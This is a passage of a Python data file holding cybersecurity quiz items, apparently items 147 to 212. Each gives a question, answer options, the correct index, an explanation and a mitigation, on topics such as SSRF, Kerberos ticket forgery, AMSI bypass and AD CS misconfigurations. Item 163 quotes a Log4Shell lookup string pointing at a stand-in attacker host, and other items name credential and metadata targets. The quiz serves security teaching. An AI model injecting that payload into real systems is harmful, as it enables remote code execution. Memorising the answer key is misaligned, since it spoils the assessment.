         ["A vulnerability where an XML parser processes untrusted external entity references, allowing attackers to read local server files or perform SSRF", "An error in Excel spreadsheet calculations", "A method for designing webpage graphics", "A tool for compressing XML files"],
         0, "XXE exploits insecure XML parsers to read internal files (e.g. file:///etc/passwd) or scan internal intranet servers.", "Disable DTDs (External Entity Resolution) in all XML parser configurations across application code."),

        (148, "What is 'Server-Side Request Forgery' (SSRF)?",
         ["A vulnerability where a web server is tricked into making unauthorized HTTP requests to internal resources (e.g. localhost, cloud metadata APIs)", "A forgery of server purchase receipts", "A physical attack on server rack mountings", "A method for hosting multiple websites on one server"],
         0, "SSRF allows attackers to query internal services behind firewalls, including cloud metadata endpoints (169.254.169.254) to steal IAM credentials.", "Validate and whitelist all destination URLs, disable HTTP redirects, and enforce IMDSv2 in cloud environments."),

        (149, "What is 'Certificate Authority' (CA) in PKI?",
         ["A trusted third-party organization that cryptographically issues, signs, and validates digital SSL/TLS certificates for domains and organizations", "A government department that taxes internet usage", "A software program that builds websites", "A computer repair shop"],
         0, "CAs act as the root of trust in PKI, verifying domain ownership before digitally signing public SSL certificates.", "Monitor Certificate Transparency (CT) logs for unauthorized certificates issued for your company domains."),

        (150, "What is 'Certificate Transparency' (CT) log?",
         ["A publicly auditable, append-only cryptographic log of all SSL/TLS certificates issued by Certificate Authorities, enabling rapid detection of rogue certs", "A clear plastic folder for storing paper certificates", "A list of computer hardware specifications", "An operating system error log file"],
         0, "CT logs allow domain owners to detect fraudulent or mistakenly issued certificates within minutes of issuance.", "Set up automated CT log monitoring alerts for your enterprise domains."),

        (151, "What is 'Web Application Firewall' (WAF)?",
         ["A specialized firewall that inspects and filters incoming HTTP/HTTPS traffic at Layer 7 to block SQLi, XSS, and application-layer attacks", "A physical fire extinguisher in a web hosting facility", "A browser extension that changes website colors", "A software driver for graphics cards"],
         0, "WAFs apply signature rules and anomaly detection to incoming web requests to shield web applications from exploitation.", "Deploy WAFs in front of public-facing web applications alongside secure coding practices."),

        (152, "What is 'Replay Attack' in authentication protocols?",
         ["An attacker intercepting a valid network transmission (e.g. an auth token or signature) and re-transmitting it later to gain unauthorized access", "Replaying video recordings on a computer monitor", "A tool for restarting crashed servers automatically", "A gaming feature in online video games"],
         0, "Replay attacks resend captured valid packets. Adding cryptographic nonces, timestamps, and one-time session tokens neutralizes replay attempts.", "Use unique nonces, strict timestamp validation, and TLS session tokens to prevent replay attacks."),

        (153, "What is 'Cryptographic Hash Function' (e.g. SHA-256) and its key property?",
         ["A one-way mathematical algorithm that converts arbitrary input data into a fixed-length string, where it is computationally infeasible to reverse or find collisions", "A two-way reversible encryption algorithm", "A tool for compressing video files", "A method for increasing internet speed"],
         0, "Hash functions are deterministic, fast to compute, irreversible (one-way), and resistant to preimage and collision attacks.", "Use SHA-256, SHA-3, or BLAKE3 for cryptographic integrity validation."),

        (154, "What is 'Rainbow Table Attack'?",
         ["Using precomputed tables of cryptographic hashes for millions of plaintext passwords to crack password hashes in seconds", "An attack using colorful rainbow laser beams", "A tool for designing website color schemes", "A method for cooling server hardware"],
         0, "Rainbow tables reverse unsalted password hashes by looking up precalculated hash chains.", "Always use unique cryptographic salts and slow memory-hard hashing algorithms (Argon2id/bcrypt)."),

        (155, "What is 'Penetration Testing' (Ethical Hacking)?",
         ["An authorized, simulated cyber attack against an organization's computer systems to identify exploitable security vulnerabilities before criminals do", "A physical test of server casing durability", "Installing pirated software on company laptops", "A method for testing internet download speeds"],
         0, "Penetration testing mimics real-world adversary tactics to test technical defenses, incident response, and security posture.", "Conduct regular penetration tests against external perimeters, web applications, and internal networks."),

        (156, "What is 'Vulnerability Scanning' vs 'Penetration Testing'?",
         ["Vulnerability scanning is automated discovery of known flaws; Penetration testing is manual exploitation by ethical hackers to validate real-world risk and impact", "They are identical automated processes", "Vulnerability scanning is illegal while penetration testing is legal", "Penetration testing only tests physical door locks"],
         0, "Scanners identify potential flaws, while human penetration testers chain vulnerabilities together to prove business impact.", "Use automated vulnerability scanners weekly and engage penetration testers annually."),

        (157, "What is 'Red Team' vs 'Blue Team' in cybersecurity exercises?",
         ["Red Team acts as the offensive adversary attacking the organization; Blue Team acts as the defensive team detecting and responding to attacks", "Red Team writes code; Blue Team tests software for bugs", "Red Team works on hardware; Blue Team works on software", "They are two competing video gaming teams"],
         0, "Red teams simulate sophisticated APT threats, while Blue teams defend assets, monitor SIEM telemetry, and hunt intrusions.", "Conduct collaborative Purple Team exercises to maximize learning between offensive and defensive teams."),

        (158, "What is 'Purple Teaming'?",
         ["A collaborative security exercise where Red (offensive) and Blue (defensive) teams work together in real time to optimize detection and response capabilities", "Painting server room walls purple", "A software program for mixing colors", "A type of physical security badge"],
         0, "Purple teaming eliminates silos, allowing defenders to immediately verify whether SIEM/EDR rules trigger during simulated attack techniques.", "Schedule regular purple team workshops to validate detection engineering coverage against MITRE ATT&CK."),

        (159, "What is 'MITRE ATT&CK' framework?",
         ["A globally accessible knowledge base of adversary tactics, techniques, and procedures (TTPs) based on real-world threat observations", "A military combat defense system", "A programming language for building firewalls", "An online database of software prices"],
         0, "MITRE ATT&CK categorizes threat behavior into distinct phases (Initial Access, Execution, Persistence, Privilege Escalation, Exfiltration).", "Map SIEM detection rules and threat intelligence against the MITRE ATT&CK matrix."),

        (160, "What is 'Cyber Kill Chain' developed by Lockheed Martin?",
         ["A framework outlining the 7 sequential stages of a cyber attack: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives", "A physical metal chain locking computer servers", "A method for deleting corrupted hard drives", "A software tool for scanning Wi-Fi networks"],
         0, "Disrupting an adversary at any single stage of the Cyber Kill Chain halts the attack before objectives are achieved.", "Build layered defensive detections across every stage of the cyber kill chain."),

        (161, "What is 'Supply Chain Attack' in software development?",
         ["Compromising a trusted third-party vendor, software library, or update mechanism (e.g. SolarWinds, open-source npm/PyPI package) to infect downstream clients", "Attacking physical shipping trucks delivering computers", "A delay in ordering computer hardware", "A method for manufacturing circuit boards"],
         0, "Supply chain attacks poison upstream software builds or dependencies, propagating malware to thousands of downstream organizations automatically.", "Implement Software Bill of Materials (SBOM), pin dependency versions, and cryptographically verify package signatures."),

        (162, "What is 'SBOM' (Software Bill of Materials)?",
         ["A formal, machine-readable inventory of all software components, third-party libraries, and dependencies included in an application build", "An invoice for purchasing software licenses", "A user manual for installing applications", "A programming language specification document"],
         0, "SBOM provides complete visibility into nested dependencies, enabling rapid identification of vulnerable packages (like Log4j).", "Generate and maintain SBOMs (e.g. CycloneDX, SPDX formats) for all proprietary and commercial software assets."),

        (163, "What is 'Log4Shell' (CVE-2021-44228) vulnerability?",
         ["A critical Remote Code Execution vulnerability in Apache Log4j caused by insecure JNDI lookup parsing of attacker-controlled log strings", "A bug in computer keyboard logging", "A tool for deleting server log files", "An operating system update tool"],
         0, "Log4Shell allowed unauthenticated attackers to execute arbitrary code simply by sending '${jndi:ldap://evil.com/a}' in any logged field (like User-Agent).", "Disable remote JNDI lookups and update Log4j libraries to patched releases."),

        (164, "What is 'Shadow IT' in an enterprise environment?",
         ["Information technology systems, devices, software, and cloud services used within an organization without explicit IT department approval or oversight", "IT technicians who work the night shift", "Computers kept in dark server rooms", "A secret hacker organization"],
         0, "Shadow IT introduces unmonitored attack surfaces, compliance violations, and unpatched vulnerabilities outside the security team's radar.", "Deploy Cloud Access Security Brokers (CASB) to discover and govern unsanctioned cloud applications."),

        (165, "What is 'CASB' (Cloud Access Security Broker)?",
         ["A security policy enforcement point placed between cloud service consumers and cloud service providers to govern cloud data security and compliance", "A physical broker who sells cloud server hardware", "A program that backs up smartphone photos", "A tool for building cloud applications"],
         0, "CASBs provide visibility into shadow IT, enforce data loss prevention (DLP), and block unauthorized file downloads across SaaS apps.", "Integrate CASB with corporate identity providers to protect Microsoft 365, Google Workspace, and Salesforce data."),

        (166, "What is 'Data at Rest' vs 'Data in Transit'?",
         ["Data at rest is static data stored on storage media (HDDs, databases); Data in transit is active data traveling across network connections", "Data at rest is data on weekends; Data in transit is data on weekdays", "Data at rest is unencrypted; Data in transit cannot be encrypted", "There is no difference between them"],
         0, "Both states require encryption: AES-256 for data at rest (BitLocker/LUKS) and TLS 1.3 for data in transit.", "Enforce full-disk encryption on all endpoint drives and strict TLS on all network interfaces."),

        (167, "What is 'BitLocker' on Microsoft Windows?",
         ["A built-in full volume encryption feature that protects data by encrypting entire drive volumes using AES encryption and TPM hardware keys", "A tool that locks the keyboard buttons", "A program for downloading video files", "A software driver for computer mice"],
         0, "BitLocker prevents unauthorized data extraction if a laptop is physically stolen or the hard drive is removed.", "Enforce BitLocker with TPM + PIN startup authentication across all corporate Windows laptops."),

        (168, "What is 'TPM' (Trusted Platform Module)?",
         ["A dedicated hardware microcontroller chip designed to provide hardware-based security functions, such as storing cryptographic encryption keys securely", "A high-speed graphics processor", "A physical cable connecting power supplies", "A software program for cleaning hard drives"],
         0, "TPMs ensure cryptographic keys cannot be extracted even if the operating system is compromised or the physical storage drive is extracted.", "Verify TPM 2.0 activation and bind full-disk encryption keys to platform PCR measurements."),

        (169, "What is 'Secure Boot' in UEFI firmware?",
         ["A security standard that ensures a device boots using only software, bootloaders, and kernel drivers trusted by the Original Equipment Manufacturer (OEM)", "Booting a computer in a secure locked room", "A software program for starting games faster", "An antivirus scan that runs at 5:00 AM"],
         0, "Secure Boot blocks bootkits and unauthorized kernel drivers from executing during the boot process before the OS loads.", "Keep UEFI Secure Boot enabled to protect the integrity of the operating system boot chain."),

        (170, "What is 'Bootkit' malware?",
         ["A stealthy type of rootkit that infects the Master Boot Record (MBR) or UEFI firmware to execute before the operating system even loads", "A pair of boots worn by IT technicians", "A software toolkit for installing operating systems", "A hardware diagnostic cable"],
         0, "Bootkits gain control at Ring -1 or Ring 0 before security software and operating system kernel protections initialize.", "Use UEFI Secure Boot and hardware-rooted integrity verification to prevent bootkit infection."),

        (171, "What is 'AirDrop / Nearby Share Spoofing' risk in public areas?",
         ["Attackers broadcasting unsolicited offensive files, phishing links, or exploit payloads to discoverable mobile devices nearby", "Sharing airplane ticket bookings online", "A method for speeding up cellular data", "An error in phone bluetooth speakers"],
         0, "Unrestricted device visibility enables 'Cyber-flashing' and malicious file transfers from strangers in close physical proximity.", "Configure mobile file sharing settings to 'Contacts Only' or 'Receiving Off' in public spaces."),

        (172, "What is 'Fileless Malware' and how does it execute?",
         ["Malware that does not write executable files to the hard drive, executing directly in volatile computer memory (RAM) via legitimate system tools (e.g. PowerShell, WMI)", "Malware that deletes all files on a computer", "Malware stored inside physical USB cables", "An operating system with zero files"],
         0, "Fileless malware leverages 'Living off the Land' binaries (LOLBins) to evade signature-based antivirus scanners.", "Use behavioral EDR and enable PowerShell Constrained Language Mode and Script Block Logging."),

        (173, "What are 'LOLBins' (Living off the Land Binaries)?",
         ["Legitimate, pre-installed operating system binaries (e.g., certutil.exe, powershell.exe, mshta.exe) weaponized by attackers to execute malicious actions without dropping new executables", "Recycle bins on the computer desktop", "Open-source video gaming utilities", "Hardware tools for cleaning motherboards"],
         0, "LOLBins allow attackers to download payloads, execute scripts, and bypass application whitelisting using trusted native Windows tools.", "Implement Application Control (WDAC/AppLocker) policies blocking unauthorized LOLBin execution."),

        (174, "What does 'PowerShell Script Block Logging' (Event ID 4104) capture?",
         ["The complete content of script blocks and commands as they are executed by the PowerShell engine, including dynamic de-obfuscated code", "The power consumption of the computer battery", "The typing speed of the user", "The screen resolution of the monitor"],
         0, "Script Block Logging captures executed PowerShell code after runtime decoding, exposing obfuscated payloads to SIEM analysis.", "Enable PowerShell Script Block Logging and Transcription across all Windows domain endpoints."),

        (175, "What is 'AMSI' (Antimalware Scan Interface) in Windows?",
         ["An interface standard that allows applications (e.g., PowerShell, Office, JScript) to send content to installed antivirus software for in-memory scanning before execution", "A hardware interface for connecting printers", "A software program for playing music", "A network routing protocol"],
         0, "AMSI inspects scripts in memory right before execution, detecting dynamically decrypted and obfuscated malware payloads.", "Monitor for AMSI patching and bypass attempts (e.g., in-memory memory patching of amsi.dll)."),

        (176, "What is 'AMSI Bypassing' in malware evasion?",
         ["Adversaries patching memory bytes of amsi.dll (e.g. AmsiScanBuffer) within their own process memory to force the scan function to always return 'Clean'", "Unplugging the computer power cable", "Deleting the antivirus desktop shortcut icon", "Renaming a file from .exe to .txt"],
         0, "Attackers overwrite instructions in memory so AMSI returns 'AMSI_RESULT_CLEAN' without inspecting malicious script strings.", "Deploy EDR tools that monitor memory protection changes (VirtualProtect) on amsi.dll."),

        (177, "What is 'DLL Sideloading' (DLL Hijacking)?",
         ["Placing a malicious DLL with the same name as a legitimate dependency in the application directory so a trusted executable loads the malicious DLL on startup", "Downloading music files from torrent sites", "Connecting two hard drives with one cable", "An error in computer screen rendering"],
         0, "DLL sideloading exploits Windows DLL search order to execute malicious code under the guise of signed, trusted binaries.", "Enforce Safe DLL Search Mode, use absolute paths in LoadLibrary calls, and verify DLL digital signatures."),

        (178, "What is 'Process Injection' in malware execution?",
         ["A technique where malicious code is injected into the virtual address space of a separate, legitimate running process to evade detection and inherit privileges", "Injecting coolant fluid into processor fans", "A tool for speeding up video rendering", "A method for terminating frozen applications"],
         0, "Process injection (e.g., DLL injection, Process Hollowing) conceals malicious execution inside benign system processes like explorer.exe.", "Monitor Windows API calls like VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread with EDR."),

        (179, "What is 'Pass-the-Hash' (PtH) attack in Windows networks?",
         ["An attack where an adversary uses a stolen NTLM password hash directly to authenticate to remote services without needing to crack the plaintext password", "Passing a football in a sports game", "Sharing encrypted files over email", "A method for hashing passwords in databases"],
         0, "Because NTLM authentication uses the hash as the proof of identity, knowing the hash is equivalent to knowing the password.", "Disable NTLM in favor of Kerberos, enable Remote Credential Guard, and restrict local administrator account reuse across systems."),

        (180, "What is 'Kerberos' protocol in Windows Active Directory?",
         ["A ticket-based network authentication protocol using symmetric-key cryptography and a trusted Key Distribution Center (KDC) to authenticate domain users", "A mythological 3-headed dog video game character", "An email encryption standard for webmail", "A hardware firewall appliance"],
         0, "Kerberos provides strong mutual authentication and single sign-on across enterprise Active Directory domains.", "Protect the Active Directory KRBTGT account password and enforce AES-256 Kerberos encryption."),

        (181, "What is 'Golden Ticket' attack in Active Directory?",
         ["Forging a Kerberos Ticket Granting Ticket (TGT) using the compromised KRBTGT service account hash, granting the attacker unrestricted Domain Admin access forever", "A prize ticket won in an online contest", "A software tool for organizing domain controllers", "A method for resetting user passwords in bulk"],
         0, "A Golden Ticket grants complete domain persistence with arbitrary user privileges, valid for years unless the KRBTGT password is reset twice.", "Rotate the KRBTGT account password twice yearly and monitor for anomalous TGT request anomalies."),

        (182, "What is 'Silver Ticket' attack?",
         ["Forging a Kerberos Service Ticket (TGS) using the stolen password hash of a specific service account, granting access to that specific service without contacting the Domain Controller", "A silver medal in a coding competition", "A tool for buying software licenses", "A hardware component in server racks"],
         0, "Silver Tickets do not interact with the KDC, making them stealthier than Golden Tickets while compromising targeted services (e.g. MSSQL, CIFS).", "Use long, complex passwords for service accounts or migrate to Group Managed Service Accounts (gMSA)."),

        (183, "What is 'Group Managed Service Accounts' (gMSA) in Active Directory?",
         ["Managed domain accounts with automatic password generation, complex 128-character passwords, and automatic rotation managed by Domain Controllers", "A social media group for IT technicians", "A spreadsheet listing company passwords", "A tool for sending marketing emails"],
         0, "gMSA eliminates static passwords in service accounts, completely neutralizing Kerberoasting and Silver Ticket attacks.", "Deploy gMSA for all scheduled tasks, Windows services, and IIS application pools."),

        (184, "What is 'Kerberoasting' attack?",
         ["Requesting Kerberos TGS service tickets for accounts with registered Service Principal Names (SPNs) and cracking their encrypted service tickets offline", "Roasting coffee in an IT office kitchen", "Deleting service accounts from Active Directory", "A tool for backing up domain controllers"],
         0, "Any valid domain user can request a TGS ticket for any SPN; the ticket is encrypted with the service account's NTLM hash and can be cracked offline.", "Audit SPN accounts and enforce 25+ character complex passwords or convert to gMSAs."),

        (185, "What is 'AS-REP Roasting' attack?",
         ["An attack targeting user accounts that have 'Do not require Kerberos preauthentication' enabled, requesting AS-REP responses and cracking the hash offline", "A tool for formatting hard drives over networks", "An error in Active Directory replication", "A method for sending automated emails"],
         0, "Accounts without Kerberos preauthentication return AS-REP packets encrypted with the user's password hash to unauthenticated requests.", "Ensure 'Do not require Kerberos preauthentication' (DONT_REQ_PREAUTH) is disabled across all Active Directory user accounts."),

        (186, "What is 'BloodHound' tool used for in security assessments?",
         ["An Active Directory reconnaissance tool that uses graph theory to map hidden attack paths, permissions, and privilege escalation relationships in a domain", "A physical security dog for server rooms", "An antivirus scanner for smartphones", "A tool for designing database schemas"],
         0, "BloodHound visualizes complex AD permission chains, identifying shortest paths to Domain Admin.", "Run BloodHound defensively to identify and eliminate high-risk ACL relationships and tiering violations."),

        (187, "What is 'Enterprise Access Model' (Tiering Architecture) in Active Directory?",
         ["Separating identity administration into distinct tiers (Tier 0: Domain Controllers, Tier 1: Servers, Tier 2: Workstations) with strict boundaries preventing credential crossover", "A company hierarchy chart for HR departments", "A pricing model for cloud software subscriptions", "A method for organizing office desks"],
         0, "Tiering prevents credential theft on a low-privilege workstation (Tier 2) from compromising Domain Controllers (Tier 0).", "Enforce strict tiering rules: Tier 0 credentials must never be entered on Tier 1 or Tier 2 machines."),

        (188, "What is 'Privileged Access Workstation' (PAW)?",
         ["A dedicated, hardened physical machine reserved exclusively for performing sensitive administrative tasks, isolated from general email and web browsing", "A computer workstation in a pet shop", "A laptop used by human resources for hiring", "A tool for playing video games"],
         0, "PAWs protect high-privilege administrative sessions from phishing, malicious downloads, and endpoint compromise.", "Require administrators to access Domain Controllers and cloud management consoles exclusively via PAWs."),

        (189, "What is 'Lateral Movement' in a cyber attack lifecycle?",
         ["Techniques adversaries use to extend their access and move from an initially compromised endpoint across the network to other internal systems", "Moving computer monitors sideways", "Transferring employees between different departments", "A method for balancing server network loads"],
         0, "Lateral movement uses protocols like RDP, SMB/psexec, and WMI to traverse internal subnets toward high-value data targets.", "Enforce host-based firewalls to block workstation-to-workstation SMB (port 445) and RDP (port 3389) traffic."),

        (190, "What is 'Pivoting' in penetration testing?",
         ["Using a compromised host as a relay or proxy to route traffic into and attack otherwise inaccessible internal network segments", "Turning a computer monitor 90 degrees", "Changing a company business strategy", "A tool for organizing spreadsheets"],
         0, "Pivoting establishes tunnels (e.g. via SSH, Chisel, or SOCKS proxies) through compromised perimeter hosts into internal enclaves.", "Segment internal networks and deploy internal intrusion detection systems (IDS) between subnets."),

        (191, "What is 'Data Sanitization' in web security?",
         ["Cleaning, filtering, or stripping potentially harmful characters and scripts from user input before processing or displaying it", "Wiping dust from server hard drive casings", "Formatting computer memory partitions", "Deleting old emails automatically"],
         0, "Sanitization prevents injection vulnerabilities (XSS, SQLi, Command Injection) by disarming malicious payload syntax.", "Combine robust input sanitization with contextual output encoding and parameterized APIs."),

        (192, "What is 'Output Encoding' and why is it crucial against XSS?",
         ["Converting untrusted data into a safe representation (e.g. converting '<' to '&lt;') so the browser treats it as text rather than executable markup", "Encrypting database backups with AES", "Translating code into machine language", "A tool for rendering video files"],
         0, "Output encoding ensures user data cannot break out of HTML, JavaScript, or attribute contexts into executable script tags.", "Apply context-aware output encoding (HTML, JavaScript, CSS, URL encoding) on all dynamic web output."),

        (193, "What is 'Subdomain Takeover' vulnerability?",
         ["An attacker registering an abandoned third-party cloud service (e.g., GitHub Pages, AWS S3, Heroku) that a dangling DNS CNAME record still points to", "Buying a new domain name from a registrar", "A server room power outage", "A tool for organizing website navigation menus"],
         0, "Subdomain takeover allows attackers to host phishing pages on a legitimate corporate subdomain (e.g. promo.company.com), bypassing CSP and cookie protections.", "Audit DNS records regularly and remove dangling CNAME pointers to decommissioned third-party services."),

        (194, "What is 'Clickjacking' defense 'frame-ancestors' directive in CSP?",
         ["A CSP directive that specifies valid parents that may embed a page in an iframe, replacing and superseding legacy X-Frame-Options headers", "A tool for building HTML frames in web design", "A software driver for computer mice", "An image editing filter in Photoshop"],
         0, "'frame-ancestors 'none'' or 'frame-ancestors 'self'' gives precise control over iframe embedding, preventing UI redress attacks.", "Deploy 'Content-Security-Policy: frame-ancestors 'none'' on all transactional web application pages."),

        (195, "What is 'SameSite' cookie attribute and its three values?",
         ["A cookie attribute controlling whether cookies are sent with cross-site requests: 'Strict' (never sent cross-site), 'Lax' (sent on top-level GET), 'None' (sent always)", "A tool for setting website background colors", "A software license agreement", "A protocol for synchronizing computer clocks"],
         0, "SameSite cookies defend against CSRF by withholding session cookies from cross-origin requests initiated by third-party sites.", "Default to 'SameSite=Lax' or 'SameSite=Strict' for all sensitive authentication session cookies."),

        (196, "What is 'CORS Preflight Request' in HTTP?",
         ["An HTTP OPTIONS request sent by the browser before the actual cross-origin request to check if the server allows the specific method and headers", "A boarding pass for airline flights", "A tool for speeding up internet downloads", "A software driver for network cards"],
         0, "Preflight OPTIONS requests check server CORS permissions before non-simple cross-origin requests (e.g. PUT/DELETE or custom headers) are sent.", "Configure CORS preflight handlers to return strict, explicit allowed headers and origins."),

        (197, "What is 'WebAuthn' (Web Authentication) standard?",
         ["A W3C standard for passwordless public-key authentication in web browsers using hardware security keys or device biometrics (Passkeys)", "A software tool for storing passwords in text files", "An online certification course for web developers", "A tool for designing website logos"],
         0, "WebAuthn provides phishing-resistant authentication cryptographically bound to the specific origin domain, defeating AiTM reverse proxies.", "Implement WebAuthn / FIDO2 Passkeys to achieve phishing-resistant multi-factor authentication."),

        (198, "What is 'FIDO2' standard composed of?",
         ["WebAuthn (Web API) and CTAP2 (Client to Authenticator Protocol), enabling external authenticators (like YubiKeys) to authenticate users securely", "A combination of SMS codes and email passwords", "A hardware cable connecting two computers", "A software program for cleaning hard drives"],
         0, "FIDO2 enables seamless, phishing-proof authentication across modern operating systems, browsers, and security keys.", "Enforce FIDO2 security keys for all high-privilege administrators and sensitive cloud workloads."),

        (199, "What is 'Passkey' in modern authentication?",
         ["A cryptographic key pair based on FIDO2/WebAuthn standards, where the private key remains secured in the device and replaces traditional passwords", "A master password written on a sticky note", "A physical key used to unlock office doors", "A discount coupon code for online shopping"],
         0, "Passkeys replace passwords entirely, providing frictionless, phishing-proof logins synchronized across user devices via end-to-end encrypted keychains.", "Promote Passkey adoption across consumer and enterprise applications."),

        (200, "What is the primary operational advantage of 'Immutable Backups' against ransomware?",
         ["Backups that cannot be altered, overwritten, encrypted, or deleted by any user or compromised admin account for a specified retention period (WORM)", "Backups stored on floppy disks", "Backups that update every 1 second", "Backups that are free of charge"],
         0, "Immutable backups guarantee recovery even if ransomware operators compromise Domain Admin credentials and attempt to wipe backup repositories.", "Enforce Write-Once-Read-Many (WORM) immutable cloud and on-prem storage policies for critical backups.")
    ]

def get_raw_advanced_data():
    return [
        (201, "Why does an 'Adversary-in-the-Middle' (AiTM) reverse proxy (e.g., Evilginx2, Muraena) successfully bypass traditional SMS and TOTP Multi-Factor Authentication?",
         ["The proxy transparently relays HTTP requests between the victim and authentic server in real-time, capturing the authenticated session cookie / bearer token upon successful MFA completion", "It cracks the server's RSA 2048-bit private key using quantum computation", "It physically clones the victim's smartphone SIM card over cellular towers", "It uses automated dictionary attacks to guess the 6-digit OTP code in 1 millisecond"],
         0, "AiTM reverse proxies act as transparent relays: the victim completes legitimate MFA on the real server, but the proxy captures the resulting session cookie, allowing the attacker to replay it.", "Deploy FIDO2 / WebAuthn Passkeys or hardware security keys, which cryptographically bind authentication to the legitimate origin domain."),

        (202, "How does FIDO2 / WebAuthn cryptographically defeat Adversary-in-the-Middle (AiTM) reverse proxy phishing?",
         ["The browser embeds the exact origin domain from the address bar into the signed authenticatorData payload; when the proxy relays this to the real server, the origin signature verification fails", "FIDO2 automatically shuts down the attacker's web server", "FIDO2 sends an unencrypted SMS code to verify the user", "FIDO2 requires typing a 100-character master password"],
         0, "WebAuthn binds authentication to the origin URL in the browser address bar. Because the phishing domain (e.g. login-microsofft.com) does not match the real origin, the cryptographic signature is rejected by the real backend.", "Enforce FIDO2 / WebAuthn as the sole authentication mechanism for sensitive systems."),

        (203, "What is 'Bring Your Own Vulnerable Driver' (BYOVD) attack in kernel exploitation?",
         ["Adversaries drop and install a legitimately signed, known-vulnerable third-party kernel driver (e.g. RTCore64.sys, gdrv.sys) to gain arbitrary Kernel Read/Write primitives and disable EDR kernel callbacks", "Attacking computer bus drivers on their way to work", "Plugging a damaged USB flash drive into a server", "Writing custom Linux device drivers for graphics cards"],
         0, "Because modern Windows requires Driver Signature Enforcement (DSE), attackers use validly signed legacy drivers containing arbitrary memory read/write flaws to blind EDRs in Ring 0.", "Enable Microsoft Vulnerable Driver Blocklist (HVCI / Memory Integrity) in Windows Defender Exploit Guard."),

        (204, "What is 'Return-Oriented Programming' (ROP) and why is it employed against Data Execution Prevention (DEP / NX / W^X)?",
         ["An advanced exploitation technique that stitches together existing small machine instruction sequences ending in 'RET' (gadgets) already present in executable memory to execute arbitrary logic without injecting new code", "A high-level programming language designed for returning customer orders", "A method for decompiling Python bytecode into source code", "A tool for returning database queries faster"],
         0, "DEP marks the stack/heap non-executable. ROP circumvents this by chaining together existing instructions ('gadgets') in signed shared libraries (libc, ntdll) to call APIs like VirtualProtect.", "Enable Control Flow Guard (CFG), Intel CET (Shadow Stacks), and position-independent executables (PIE)."),

        (205, "How does a 'Padding Oracle Attack' (e.g. against CBC mode in AES) allow an attacker to decrypt ciphertext without knowing the secret key?",
         ["By repeatedly sending manipulated ciphertext blocks and analyzing the server's cryptographic PKCS#7 padding validation error responses to deduce plaintext byte-by-byte", "By brute-forcing all possible 256-bit AES keys", "By stealing the initialization vector from memory", "By measuring physical CPU clock cycle temperatures"],
         0, "Padding oracles reveal whether modified ciphertext results in valid PKCS#7 padding, exposing intermediate decryption states through differential side-channel responses.", "Always use authenticated encryption modes (AEAD) like AES-GCM or ChaCha20-Poly1305 rather than raw CBC mode."),

        (206, "What constitutes the core operational vulnerability in 'JWT Algorithm None' attacks?",
         ["The backend server blindly trusts the 'alg' header parameter; when set to 'none' or unsigned, the server verifies the token without validating any cryptographic signature, allowing arbitrary claim forgery", "JWT tokens cannot store user roles or permissions", "JWT tokens are unencrypted by default", "JWT tokens expire too quickly in production"],
         0, "Flawed JWT libraries that accept 'alg: none' allow attackers to forge administrative tokens simply by stripping the signature block.", "Hardcode expected signature algorithms on the backend and reject tokens specifying 'none' or mismatched algorithms."),

        (207, "What is 'DCShadow' attack in Active Directory persistence?",
         ["A post-exploitation technique where an attacker temporarily registers a rogue workstation as an Active Directory Domain Controller using RPC calls to replicate malicious directory objects without logging standard event IDs", "A shadow cast by a computer server rack", "A method for creating backup domain controllers in Azure", "A tool for turning off server monitors remotely"],
         0, "DCShadow bypasses traditional SIEM log collectors because the changes are injected via legitimate directory replication protocols (DRS) rather than standard LDAP APIs.", "Monitor for DRS RPC calls (DsAddEntry, DsReplicaAdd) originating from non-Domain Controller computer accounts."),

        (208, "What is 'DCSync' attack and what Active Directory permissions are required to execute it?",
         ["Abusing Directory Replication Service (DRS) Remote Protocol using 'DS-Replication-Get-Changes-All' rights to impersonate a Domain Controller and dump NTLM password hashes for all domain users", "Cracking Wi-Fi WPA2 pre-shared keys", "Physical synchronization of two computer clocks", "Deleting Active Directory user accounts via PowerShell"],
         0, "DCSync allows attackers with replication rights (Domain Admins or delegated accounts) to pull password hashes directly from the KDC over RPC without running code on the Domain Controller.", "Audit Active Directory ACLs to ensure only legitimate Domain Controller computer accounts possess DRS replication privileges."),

        (209, "What is 'Active Directory Certificate Services' (AD CS) ESC1 vulnerability?",
         ["A misconfigured certificate template with 'ENROLLEE_SUPPLIES_SUBJECT' enabled and Client Authentication EKU, allowing any low-privileged domain user to request a certificate as Domain Admin and authenticate via PKINIT", "A broken SSL certificate on an external website", "An error in printing paper certificates", "A software driver bug in smart card readers"],
         0, "ESC1 allows low-privileged users to specify arbitrary Subject Alternative Names (SAN) in certificate enrollment requests, resulting in instant Domain Administrator takeover.", "Disable 'ENROLLEE_SUPPLIES_SUBJECT' on certificate templates that permit Client Authentication."),

        (210, "What is 'Active Directory Certificate Services' (AD CS) ESC8 vulnerability?",
         ["NTLM Relay attack targeting AD CS HTTP Web Enrollment endpoints (certsrv) to relay machine or user NTLM authentication and obtain a valid client certificate for domain persistence", "An error in DNS resolution for certificate authorities", "A buffer overflow in Windows print spooler", "A physical attack on certificate hardware modules"],
         0, "Coerced authentication (via PetitPotam or PrinterBug) relayed to unencrypted AD CS HTTP web enrollment endpoints generates valid domain certificates for machine accounts.", "Disable HTTP web enrollment endpoints or enforce Extended Protection for Authentication (EPA) and require HTTPS with channel binding."),

        (211, "What is 'SAML XML Signature Wrapping' (XSW) attack?",
         ["Exploiting discrepancies between how SAML signature verification logic and application business logic navigate XML DOM trees, allowing attackers to inject forged assertions while keeping the signature valid", "Wrapping physical XML cables with copper shielding", "Encrypting XML files with AES-256", "A tool for formatting XML documents"],
         0, "XSW attacks modify the XML document structure so the signature validator validates a benign original block while the application logic parses the attacker-injected malicious assertion.", "Use hardened SAML libraries that enforce strict schema validation and verify that the signed assertion matches the processed assertion."),

        (212, "In PKI, what is 'Bleichenbacher's Chosen-Ciphertext Attack' (Million Message Attack) against RSA PKCS#1 v1.5?",
         ["An attack exploiting error message side-channels (padding valid vs invalid) in RSA PKCS#1 v1.5 decryption to decrypt arbitrary ciphertexts or forge signatures by sending adaptive chosen ciphertexts", "A brute-force attack testing 1 million passwords per second", "An attack that sends 1 million spam emails to a mail server", "A method for breaking AES-256 in 1 hour"],
         0, "Bleichenbacher's attack iteratively queries an RSA oracle that reveals whether decrypted ciphertext conforms to PKCS#1 v1.5 padding rules, recovering plaintext in ~1 million queries.", "Migrate from RSA PKCS#1 v1.5 to RSA-OAEP (Optimal Asymmetric Encryption Padding) or ECDSA/Ed25519."),

